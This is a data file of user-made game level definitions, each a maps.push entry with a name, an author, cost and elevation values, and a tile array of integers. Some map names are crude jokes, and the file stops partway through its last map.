maps.push({name="NoName19",author="fantasy",id="#1658249081",direction="forward",cost=313,elevation=-3,map=[0,0,0,0,0,8,8,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,8,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,9,9,8,8,8,8,8,0,0,0,0,0,0,0,0,0,0,0,8,8,8,9,9,8,8,8,8,8,8,0,0,0,0,0,0,0,0,0,8,8,9,9,9,9,9,8,8,8,8,8,8,0,0,0,0,0,0,8,8,8,9,9,9,9,9,8,10,10,8,8,8,8,0,0,0,8,8,8,8,10,10,9,9,9,9,9,9,10,10,8,8,8,8,0,100,8,8,8,11,11,10,8,9,9,9,9,9,10,10,8,8,8,8,8,8,8,8,8,10,11,10,10,10,9,9,8,10,10,10,10,8,9,9,8,8,8,8,8,10,10,11,10,10,8,10,10,10,11,11,11,11,9,9,8,8,8,8,8,8,10,11,11,10,10,10,11,11,11,11,9,9,9,9,9,8,8,8,8,8,8,10,11,11,11,11,11,9,9,9,9,9,9,9,9,8,8,8,8,8,8,10,11,11,10,10,8,9,9,9,9,8,8,9,8,7,7,8,8,8,8,10,10,10,10,10,8,8,8,8,8,8,9,8,8,7,7,7,7,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,100,7,6,6,7,7,7,8,8,8,8,8,8,8,8,8,8,8,8,8,0,6,6,6,6,7,7,7,8,8,8,8,8,8,8,8,8,8,8,0,0,5,5,6,6,7,7,7,8,8,8,8,8,8,8,8,8,0,0,0,0,5,5,5,6,7,7,7,8,8,8,8,8,8,0,0,0,0,0,0,0,2,2,5,6,6,7,8,8,8,8,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="NoName20",author="fantasy",id="#1658249186",direction="forward",cost=136,elevation=0,map=[0,0,0,0,1,1,2,2,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,117,117,117,117,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,117,117,117,117,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,91,91,91,91,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,117,117,117,117,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,117,117,117,117,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,117,117,117,117,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,117,117,117,117,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,117,117,117,117,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,91,91,91,91,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,91,91,91,91,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,117,117,117,117,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,117,117,117,117,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,117,117,117,117,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,117,117,117,117,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,117,117,117,117,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,91,91,91,91,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,117,117,117,117,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,117,117,117,117,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,2,2,1,1,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Judgement",author="tilgep",id="#1658252904",direction="forward",cost=208,elevation=19,map=[0,0,5,5,5,5,5,5,5,2,2,5,5,5,5,5,5,5,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,5,5,3,5,5,5,5,5,5,5,5,5,5,3,5,5,0,0,0,0,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,0,0,0,0,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,0,0,0,0,0,15,15,15,15,15,15,15,15,15,15,15,15,15,15,0,0,0,0,0,0,0,15,15,4,15,15,15,15,15,15,4,15,15,0,0,0,0,0,0,0,0,18,18,18,18,18,18,18,18,18,18,18,18,0,0,0,0,0,0,0,0,18,18,18,18,18,18,18,18,18,18,18,18,0,0,0,0,0,0,0,0,18,18,18,18,18,18,18,18,18,18,18,18,0,0,0,0,0,0,0,0,0,18,18,18,4,18,18,4,18,18,18,0,0,0,0,0,0,0,0,0,0,0,21,21,21,21,21,21,21,21,0,0,0,0,0,0,0,0,0,0,0,0,21,21,21,21,21,21,21,21,0,0,0,0,0,0,0,0,0,0,0,0,0,21,21,21,21,21,21,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,21,21,21,21,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,4,4,4,4,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,2,2,24,0,0,0,0,0,0,0,0]});
maps.push({name="Maze Game",author="Niikos",id="#1658255300",direction="left",cost=391,elevation=0,map=[1,1,1,1,1,1,1,1,5,5,5,5,5,1,1,1,1,2,2,5,1,1,1,1,1,1,1,1,5,5,5,5,5,1,1,1,1,5,5,5,1,1,1,1,1,1,1,1,5,5,1,5,5,1,1,1,1,5,5,5,1,1,1,1,1,1,1,1,5,5,1,5,5,1,1,1,1,5,5,5,1,1,1,1,1,1,1,1,5,5,1,5,5,1,1,1,1,5,5,5,1,1,1,1,1,1,1,1,5,5,1,5,5,1,1,1,1,5,5,5,1,1,1,1,1,1,1,1,5,5,1,5,5,1,1,1,1,5,5,5,1,1,1,1,1,1,1,1,5,5,1,5,5,1,1,1,1,5,5,5,1,1,1,5,5,5,1,1,5,5,1,5,5,1,1,1,1,5,5,5,1,1,1,5,1,5,1,1,5,1,1,5,5,1,1,1,1,5,5,5,2,5,5,5,1,5,5,5,5,1,1,5,5,1,1,1,1,5,5,5,2,1,1,1,1,1,1,1,1,1,1,5,5,1,1,1,1,5,5,5,1,1,1,1,1,0,1,1,1,1,1,5,5,1,1,1,1,5,5,5,1,1,1,1,1,1,0,1,1,1,1,5,5,1,1,1,1,5,5,5,1,1,0,1,1,1,1,0,1,1,1,5,5,1,1,1,1,5,5,5,1,1,1,1,1,1,1,0,1,1,1,5,5,1,1,1,1,5,5,5,1,1,0,1,1,1,1,0,1,1,1,5,5,1,1,1,1,5,5,5,1,1,1,1,1,1,0,1,1,1,1,5,5,1,1,1,1,5,5,5,1,1,1,1,1,0,1,1,1,1,1,5,5,5,5,5,5,5,5,5,1,1,1,1,1,1,1,1,1,1,1,5,5,5,5,5,5,5,5,5]});
maps.push({name="The Funny Button",author="tilgep",id="#1658256307",direction="right",cost=318,elevation=0,map=[0,0,14,2,2,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,14,14,14,14,96,1,14,14,14,14,14,14,0,0,0,0,0,0,0,0,14,14,14,14,96,96,96,1,14,14,14,14,14,0,0,96,0,0,0,0,14,14,14,14,14,14,96,96,1,14,14,14,14,14,0,96,0,0,0,0,14,14,14,14,14,14,14,96,96,96,1,14,14,14,14,96,14,0,0,0,14,14,14,14,14,14,14,14,14,96,96,96,96,96,96,96,14,14,0,0,14,14,14,14,14,14,14,14,14,14,14,14,97,14,14,14,14,2,0,0,14,14,14,14,14,14,14,14,14,96,96,96,96,96,96,96,14,2,0,0,14,14,14,14,14,14,14,96,96,96,1,14,14,14,14,96,14,14,0,0,14,14,14,14,14,14,96,96,1,14,14,14,14,14,0,96,0,0,0,0,14,14,14,14,14,96,96,1,14,14,14,14,14,14,0,96,0,0,0,0,14,14,14,14,96,96,1,14,14,14,14,14,14,0,0,0,0,0,0,0,14,14,14,14,96,1,14,14,14,14,14,14,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="BreakableGFL",author="Niikos",id="#1658260699",direction="forward",cost=678,elevation=0,map=[114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,2,2,114,114,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,114,114,91,114,114,114,114,114,114,114,91,91,91,91,91,91,91,91,91,91,114,114,91,114,91,91,91,91,91,114,91,91,91,91,91,91,91,91,91,91,114,114,91,114,91,91,91,91,91,114,91,91,91,91,91,91,91,91,91,91,114,114,91,114,91,91,114,91,91,114,91,91,91,91,91,91,91,91,91,91,114,114,91,114,91,91,114,91,91,114,91,91,91,91,91,91,91,91,91,91,114,114,91,114,91,91,114,114,114,114,91,91,91,91,91,91,91,91,91,91,114,114,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,114,114,91,91,91,91,91,114,114,114,114,114,114,114,114,91,91,91,91,91,114,114,91,91,91,91,91,114,91,91,114,91,91,91,91,91,91,91,91,91,114,114,91,91,91,91,91,114,91,91,114,91,91,91,91,91,91,91,91,91,114,114,91,91,91,91,91,114,91,91,91,91,91,91,91,91,91,91,91,91,114,114,91,91,91,91,91,91,91,91,91,91,114,114,114,114,114,114,114,91,114,114,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,114,91,114,114,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,114,91,114,114,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,114,91,114,114,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,114,91,114,114,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,114,114,2,2,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114]});
maps.push({name="IKEA",author="MoistNoodlez",id="#1658270323",direction="right",cost=641,elevation=0,map=[1,72,66,66,2,2,34,34,34,34,34,34,34,66,66,72,1,1,1,1,1,72,66,66,34,34,34,34,34,34,34,34,34,66,66,72,1,14,14,14,1,72,66,66,66,66,66,66,66,66,66,66,66,66,66,72,1,132,14,2,1,72,66,66,66,66,66,66,66,66,66,66,66,66,66,72,1,14,14,2,1,72,66,66,34,34,34,34,34,34,34,34,34,66,66,72,1,14,14,14,1,72,66,66,66,66,66,34,34,34,66,66,66,66,66,72,1,1,1,1,1,72,66,66,66,34,34,66,66,66,34,34,66,66,66,72,1,0,0,0,1,72,66,66,34,34,66,66,66,66,66,34,34,66,66,72,1,0,0,0,1,72,66,66,66,66,66,66,66,66,66,66,66,66,66,72,1,0,0,0,1,72,66,66,66,66,66,66,66,66,66,66,66,66,66,72,1,0,0,0,1,72,66,66,34,34,34,34,34,34,34,34,34,66,66,72,1,0,0,0,1,72,66,66,34,66,66,66,34,66,66,66,34,66,66,72,1,0,0,0,1,72,66,66,34,66,66,66,34,66,66,66,34,66,66,72,1,0,0,0,1,72,66,66,66,66,66,66,66,66,66,66,66,66,66,72,1,0,0,0,1,72,66,66,66,66,66,66,66,66,66,66,66,66,66,72,1,0,0,0,1,72,66,66,66,34,34,34,34,34,34,34,34,66,66,72,1,0,0,0,1,72,66,66,34,66,66,66,34,66,66,66,66,66,66,72,1,0,0,0,1,72,66,66,34,66,66,66,34,66,66,66,66,66,66,72,1,0,0,0,1,72,66,66,66,34,34,34,34,34,34,34,34,66,66,72,1,0,0,0,1,97,74,74,74,74,74,74,74,74,74,74,74,74,74,96,131,1,0,0]});
maps.push({name="Spire",author="MoistNoodlez",id="#1658274497",direction="forward",cost=535,elevation=0,map=[1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,0,0,0,1,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,1,0,0,0,1,5,66,66,125,66,66,66,66,66,66,66,125,66,66,5,1,0,0,0,1,5,66,66,77,75,75,77,77,77,75,75,77,66,66,5,1,0,0,0,1,125,66,77,76,54,54,76,76,76,54,54,76,77,66,125,1,0,0,0,1,5,66,75,54,54,54,54,54,54,54,54,54,75,66,5,1,0,0,0,1,5,66,75,54,54,14,54,54,54,14,54,54,75,66,5,1,0,0,0,1,5,66,75,54,14,125,14,14,14,125,14,54,75,66,5,1,0,0,0,1,5,66,75,54,54,14,124,124,124,14,54,54,75,66,5,1,0,0,0,1,125,66,77,76,54,14,124,97,124,14,54,76,77,66,125,1,0,0,0,1,5,66,75,54,54,14,124,124,124,14,54,54,75,66,5,1,0,0,0,1,5,66,75,54,14,125,14,14,14,125,14,54,75,66,5,1,0,0,0,1,5,66,75,54,54,14,54,54,54,14,54,54,75,66,5,1,0,0,0,1,5,66,77,76,54,54,54,54,54,54,54,76,77,66,5,1,0,0,0,1,5,66,75,77,76,76,76,76,76,76,76,77,75,66,5,1,0,0,0,1,5,66,66,75,77,77,77,77,77,77,77,75,66,66,5,1,0,0,0,1,5,66,66,65,65,65,65,65,65,65,65,65,66,66,5,1,0,0,0,1,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,1,0,0,0,1,5,5,5,5,5,5,5,96,96,5,5,5,5,5,5,1,0,0,0,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,0,0,0]});
maps.push({name="HammerHold",author="MoistNoodlez",id="#1658282685",direction="forward",cost=572,elevation=0,map=[1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,1,1,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,1,1,14,95,95,95,95,95,95,95,95,95,95,14,14,14,14,14,14,14,1,1,14,95,95,14,14,14,14,14,14,95,95,14,14,14,14,14,14,14,1,1,14,95,95,14,14,14,14,14,14,95,95,14,14,14,14,14,14,14,1,1,14,95,95,14,14,14,14,14,14,95,95,14,14,14,14,14,14,14,1,1,95,95,95,14,14,14,14,14,14,95,95,95,95,95,95,95,95,95,1,1,91,91,91,14,14,14,14,14,14,91,91,91,91,91,91,91,91,91,1,1,91,91,91,14,14,14,14,14,14,91,91,91,91,91,91,91,91,91,1,1,91,91,91,14,14,14,14,14,14,91,91,91,91,91,91,91,91,91,1,1,95,95,95,14,14,14,14,14,14,95,95,95,95,95,95,95,95,95,1,1,14,95,95,14,14,14,14,14,14,95,95,14,14,14,14,14,14,14,1,1,14,95,95,14,14,14,14,14,14,95,95,14,14,14,14,14,14,14,1,1,14,95,95,14,14,14,14,14,14,95,95,14,14,14,14,14,14,14,1,1,14,95,95,95,95,95,95,95,95,95,95,14,14,14,14,14,14,14,1,1,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,1,1,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,1,1,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="MinecraftParkour",author="MoistNoodlez",id="#1658282961",direction="forward",cost=470,elevation=0,map=[24,24,24,24,24,24,24,24,24,24,24,24,24,24,2,2,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,95,95,95,95,1,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,95,95,95,95,1,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,24,24,24,24,1,5,5,66,5,5,5,5,5,5,5,5,5,5,5,5,24,89,24,24,1,5,5,5,5,5,5,5,66,5,5,5,5,5,5,5,24,24,24,24,1,5,5,5,5,5,5,5,5,5,5,5,5,66,5,5,24,24,89,24,1,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,24,24,24,24,1,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,95,95,95,95,1,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,95,95,95,95,1,5,5,5,5,5,5,5,5,5,5,5,3,3,3,5,24,24,24,89,89,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,89,89,24,89,89,89,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,89,89,89,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,89,89,89,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,89,89,24,89,89,89,24,24,24,95,95,95,95,95,95,95,95,24,24,24,89,89,24,24,24,24,24,24,24,95,24,24,24,24,24,24,95,24,24,24,24,24,24,24,24,24,24,24,24,95,24,95,95,95,95,24,95,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,2,2,1,1,1]});
maps.push({name="Mapeadores Museum",author="Hichatu",id="#1658326999",direction="forward",cost=521,elevation=0,map=[0,0,0,0,0,0,1,1,1,2,2,1,1,1,0,0,0,0,0,0,0,0,0,0,1,1,76,76,76,5,5,76,76,76,1,1,0,0,0,0,0,0,0,1,76,76,76,5,5,5,5,5,5,76,76,76,1,0,0,0,0,0,1,76,76,5,5,94,5,5,5,5,94,5,5,76,76,1,0,0,0,1,76,76,5,5,92,5,5,92,5,5,5,92,5,5,76,76,1,0,0,1,76,5,5,94,5,94,5,5,5,5,94,5,94,5,5,76,1,0,1,76,76,5,92,5,92,5,5,5,5,5,5,92,5,92,5,76,76,1,1,76,5,94,5,94,5,94,5,5,92,5,94,5,94,5,94,5,76,1,1,76,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,76,1,1,76,5,5,92,5,5,5,5,89,89,5,92,5,5,5,5,5,76,1,1,76,5,5,5,5,5,92,5,89,89,5,5,5,5,92,5,5,76,1,1,76,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,76,1,1,76,5,93,5,93,5,93,5,92,5,5,93,5,93,5,93,5,76,1,1,76,76,5,92,5,92,5,5,5,5,5,5,92,5,92,5,76,76,1,0,1,76,5,5,93,5,93,5,5,5,5,93,5,93,5,5,76,1,0,0,1,76,76,5,5,92,5,5,5,92,5,5,92,5,5,76,76,1,0,0,0,1,76,76,5,5,93,5,5,5,5,93,5,5,76,76,1,0,0,0,0,0,1,76,76,76,5,100,5,5,5,5,76,76,76,1,0,0,0,0,0,0,0,1,1,76,76,76,5,5,76,76,76,1,1,0,0,0,0,0,0,0,0,0,0,1,1,1,2,2,1,1,1,0,0,0,0,0,0]});
maps.push({name="Death Valley",author="shel1bert",id="#1658333712",direction="forward",cost=173,elevation=-14,map=[0,0,0,0,0,0,0,1,2,2,1,0,0,0,18,0,0,18,0,0,0,0,0,0,0,0,0,1,19,19,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,19,19,19,19,19,1,0,0,0,18,0,0,18,0,0,0,0,1,0,0,19,89,1,1,19,18,18,0,0,0,0,0,97,0,0,0,1,0,18,0,0,1,0,0,1,18,17,1,0,0,0,0,0,0,0,0,1,0,18,18,0,1,0,0,1,17,89,16,1,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,1,16,16,15,1,0,0,0,0,0,0,1,0,17,17,0,0,17,100,0,0,1,15,15,1,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,1,15,15,1,0,0,0,0,0,0,0,0,1,0,16,0,1,1,0,1,15,15,89,1,0,0,0,0,0,0,0,0,0,1,16,0,15,0,1,15,15,15,1,0,0,0,0,0,0,0,0,0,0,0,1,0,15,0,0,0,15,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,65,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,65,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,24,77,5,5,5,77,24,1,0,0,0,0,0,0,0,0,0,0,1,24,77,5,89,5,77,24,1,0,0,0,0,0,0,0,0,0,0,1,24,77,5,5,5,77,24,1,0,0,0,0,0,0,0,0,0,0,1,24,77,96,96,5,77,24,1,0,0,0,0,0,0,0,0,0,0,0,0,1,96,5,5,96,24,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,2,2,5,1,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Hold Them Back",author="Niikos",id="#1658343879",direction="forward",cost=572,elevation=0,map=[34,103,34,34,77,77,77,34,34,2,2,34,34,34,77,77,77,34,98,34,103,97,103,34,77,77,77,34,34,34,34,34,34,34,77,77,77,98,102,98,34,103,34,34,77,77,77,34,34,34,34,34,34,34,77,77,77,34,98,34,34,34,34,34,77,77,77,34,34,34,34,34,34,34,77,77,77,34,34,34,34,34,34,34,77,77,77,34,34,34,34,34,34,34,77,77,77,34,34,34,34,34,34,34,77,77,77,34,34,34,34,34,34,34,77,77,77,34,34,34,34,34,34,34,77,77,77,77,77,34,34,34,77,77,77,77,77,34,34,34,34,34,34,34,77,77,77,77,77,34,34,34,77,77,77,77,77,34,34,34,34,34,34,34,77,77,77,34,34,34,34,34,34,34,77,77,77,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,101,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,101,104,101,34,34,34,34,34,96,96,96,96,34,34,34,34,34,0,0,92,34,101,34,34,34,34,96,96,96,2,2,96,96,96,34,34,34,0,99,44]});
maps.push({name="SliderZ",author="Niikos",id="#1658353125",direction="forward",cost=633,elevation=0,map=[1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,14,14,14,1,135,135,135,135,135,135,14,14,135,135,135,135,1,1,1,1,14,14,14,1,135,135,135,135,135,135,14,14,135,135,135,135,135,1,1,1,14,14,14,1,135,135,135,135,135,135,14,14,135,135,135,135,135,135,1,1,14,14,14,1,135,135,135,135,135,135,14,14,135,135,135,135,135,135,1,1,14,14,14,1,135,135,135,135,135,135,14,14,135,135,135,135,135,135,1,1,135,135,135,1,135,135,135,135,135,135,1,1,1,1,135,135,135,135,1,1,135,135,135,1,135,135,135,135,135,1,135,135,135,135,1,135,135,135,1,1,135,135,135,1,135,135,135,135,1,135,135,135,135,135,1,135,135,135,1,1,135,135,135,1,135,135,135,1,135,135,135,135,135,135,1,135,135,135,1,1,135,135,135,1,135,135,135,1,135,135,135,135,135,135,135,1,135,135,1,1,135,135,135,1,135,135,135,1,135,135,1,135,135,135,135,1,135,135,1,1,135,135,135,1,135,135,135,1,135,135,1,1,135,135,135,135,135,135,1,1,135,135,135,1,135,135,135,1,135,135,135,1,135,135,135,135,135,135,1,1,135,135,135,1,135,135,135,1,135,135,135,135,1,135,135,135,135,135,1,1,135,135,135,135,135,135,135,1,135,135,135,135,135,1,1,1,1,1,1,1,135,135,135,135,135,135,135,1,135,135,135,135,135,135,135,135,14,14,1,1,1,135,135,135,135,135,1,1,135,135,135,135,135,135,135,14,14,14,1,1,1,1,1,1,1,1,1,1,135,135,135,135,135,135,14,14,14,14,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,2,2,1]});
maps.push({name="climbingdick",author="MoistNoodlez",id="#1658359089",direction="forward",cost=122,elevation=18,map=[0,0,2,2,26,75,26,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,26,26,26,26,26,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,28,28,28,28,28,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,28,28,28,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,30,30,30,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,30,30,30,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,32,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,32,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,36,36,36,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,36,36,36,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,40,0,91,91,91,0,0,0,0,0,0,0,0,0,0,0,0,0,42,42,42,91,91,91,91,91,44,0,0,0,0,0,0,0,0,0,0,0,42,42,42,91,91,44,91,91,44,44,0,0,0,0,0,0,0,0,0,0,44,44,44,91,91,91,91,91,44,44,44,0,0,0,0,0,0,0,0,0,44,44,44,91,91,91,91,91,2,2,44,0,0,0,0,0]});
maps.push({name="HairyVagina",author="MoistNoodlez",id="#1658361566",direction="left",cost=427,elevation=0,map=[2,2,1,91,0,91,91,0,0,0,91,91,0,0,0,0,0,0,0,0,131,24,1,91,0,91,0,0,0,0,91,0,0,0,0,0,0,0,0,0,1,1,1,91,91,124,91,124,124,91,124,124,124,124,124,124,124,0,0,0,91,91,124,91,124,91,91,124,91,124,124,124,124,124,88,124,88,124,124,132,91,124,124,91,124,124,54,54,54,54,54,54,54,54,124,124,124,87,124,132,91,124,91,124,54,54,54,54,54,54,54,54,54,54,54,54,54,124,124,124,91,91,124,54,54,54,76,76,76,76,54,54,54,54,54,54,54,54,124,124,124,91,91,92,76,76,76,76,76,76,76,76,76,76,76,54,54,54,124,124,2,124,122,122,76,76,76,94,76,76,76,76,76,76,76,76,54,54,124,124,2,124,122,122,76,76,94,76,76,76,76,76,76,76,54,54,54,54,124,124,124,124,91,92,76,76,76,76,76,76,76,76,54,54,54,54,54,124,124,0,124,124,124,54,54,54,54,54,54,54,54,54,54,54,54,124,124,124,124,0,91,124,91,124,124,54,54,54,54,54,54,124,124,124,124,124,87,124,124,0,91,0,124,91,124,124,91,124,124,91,124,124,124,124,124,88,124,0,0,0,91,0,91,91,91,0,91,0,0,0,91,0,0,0,0,0,0,0,0,0,91,91,91,0,91,91,0,91,0,0,91,0,0,0,0,0,0,0,0,0,91,91,0,0,91,91,0,91,0,0,0,91,0,0,0,0,0,0,0,0,0,91,0,0,91,0,0,91,0,0,0,0,0,0,0,0,0,0,0,0,0,91,0,0,91,0,0,91,91,0,0,0,0,0,0,0,0,0,0,0,0,0,91,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="BloodVessel",author="MoistNoodlez",id="#1658362052",direction="forward",cost=282,elevation=0,map=[0,1,124,120,118,116,114,2,2,114,116,118,120,124,1,0,0,0,0,0,0,1,124,120,118,116,114,114,114,114,116,118,120,124,1,0,0,0,0,0,0,1,124,120,118,116,114,114,114,114,116,118,120,124,1,0,0,0,0,0,0,1,124,120,118,116,114,114,114,114,116,118,120,124,1,0,0,0,0,0,0,1,124,120,118,116,114,88,114,114,116,118,120,124,1,0,0,0,0,0,0,1,124,120,118,116,114,114,114,88,116,118,120,124,1,0,0,0,0,0,0,1,124,120,118,116,114,88,114,114,116,118,120,124,1,0,0,0,0,0,0,1,124,120,118,116,114,114,114,114,116,118,120,124,1,0,0,0,0,0,0,1,124,120,118,116,114,90,114,88,116,118,120,124,1,0,0,0,0,0,0,1,124,120,118,116,114,114,114,114,116,118,120,124,1,0,0,0,0,0,0,1,124,120,118,116,88,114,114,114,116,118,120,124,1,0,0,0,0,0,0,1,124,120,118,116,114,114,88,114,116,118,120,124,1,0,0,0,0,0,0,1,124,120,118,116,88,114,114,114,116,118,120,124,1,0,0,0,0,0,0,1,124,120,118,116,114,114,114,114,116,118,120,124,1,0,0,0,0,0,0,1,124,120,118,116,114,114,114,114,116,118,120,124,1,0,0,0,0,0,0,1,124,120,118,116,90,114,88,114,116,118,120,124,1,0,0,0,0,0,0,1,124,120,118,116,114,114,114,88,116,118,120,124,1,0,0,0,0,0,0,1,124,120,118,116,88,114,114,114,116,118,120,124,1,0,0,0,0,0,0,1,124,120,118,116,114,114,114,88,116,118,120,124,1,0,0,0,0,0,0,1,124,120,118,116,114,2,2,114,116,118,120,124,1,0,0,0,0,0]});
maps.push({name="Threesome",author="Niikos",id="#1658363333",direction="left",cost=378,elevation=0,map=[105,105,105,105,105,105,105,105,105,105,105,1,0,0,0,0,1,2,2,0,105,105,105,105,105,105,105,105,105,65,65,1,0,0,0,0,1,25,25,65,105,105,105,105,105,105,105,105,105,65,65,1,0,0,0,0,1,25,25,65,105,105,1,65,65,1,46,46,1,92,92,1,0,0,0,0,1,25,25,65,105,105,1,65,65,1,47,47,1,95,95,1,0,0,0,0,1,25,25,65,105,105,1,65,65,1,48,48,1,64,64,1,1,1,1,1,1,25,25,65,105,105,1,65,65,1,49,49,1,64,64,64,64,64,64,64,3,25,25,65,105,105,1,65,65,1,50,50,1,64,64,64,64,64,64,64,3,25,25,65,105,105,1,0,0,1,51,51,1,1,1,1,1,1,1,1,1,25,25,65,2,105,1,0,0,1,52,52,1,0,0,0,0,0,0,0,1,25,25,65,2,105,1,0,0,1,53,53,1,0,0,0,0,0,0,0,1,25,25,65,65,65,1,0,0,1,54,54,1,1,1,1,1,1,